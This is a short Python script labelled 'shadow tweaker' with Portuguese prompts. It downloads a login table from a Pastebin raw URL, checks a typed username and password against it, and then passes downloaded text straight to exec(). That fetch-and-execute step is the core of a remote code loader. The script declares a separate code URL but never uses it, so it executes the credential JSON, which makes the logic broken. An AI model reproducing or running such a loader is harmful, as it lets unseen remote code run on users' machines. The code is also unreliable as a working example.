import requests
import json
import time
import platform

# code by saintwq - shadow tweaker
# shadow tweaker - 2023

def authenticate_user(username, password, auth_data):
    if username in auth_data and auth_data[username] == password:
        return True
    return False

pastebin_login_url = "https://pastebin.com/raw/fArbGgkR"
pastebin_code_url = "https://pastebin.com/raw/gF7tyWCf"

response = requests.get(pastebin_login_url)

if response.status_code == 200:
   
    auth_data = json.loads(response.text)

    while True:
        username = input("Digite seu nome de usuário: ")
        password = input("Digite sua senha: ")

        if authenticate_user(username, password, auth_data):
            print("Login bem-sucedido!")

            # Verifique se a solicitação foi bem-sucedida
            if response.status_code == 200:
                python_code = response.text

                # Use a função platform.platform() para obter informações sobre o dispositivo
                device_info = platform.platform()
                print(f"Modelo do dispositivo: {device_info}")

            break
        else:
            print("Login falhou. Por favor, verifique seu nome de usuário e senha.")

try:
    exec(python_code)
except Exception as e:
    print(f"Erro ao executar o código Python: {e}")

# code by saintwq - shadow tweaker
# shadow tweaker - 2023
